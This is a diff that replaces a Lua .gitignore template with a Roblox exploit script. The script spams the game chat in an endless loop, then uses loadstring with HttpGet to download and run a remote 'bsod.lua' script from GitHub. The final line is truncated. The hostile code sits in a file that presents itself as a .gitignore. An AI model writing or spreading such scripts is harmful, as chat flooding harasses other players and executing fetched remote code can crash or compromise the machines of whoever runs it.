@@ -1,41 +1,32 @@
-# Compiled Lua sources
-luac.out
+local message = "Aiplay on top"
+_G.BetterSpammer = true
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+local function Beta()
+    if not ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+        return true
+    else
+        return false
+    end
+end
 
-# Precompiled Headers
-*.gch
-*.pch
+local Beta = Beta()
+local function Chat(Message)
+    if Beta == true then
+        local Channels = TextChatService.TextChannels
+        local General = Channels.RBXGeneral
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+        General:SendAsync(Message)
+    else
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, "All")
+    end
+end
+while task.wait() and _G.BetterSpammer do
+ task.spawn(function()
+Chat(message)
+  end)
+end
+wait(1)
+loadstring(game:HttpGet'https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua
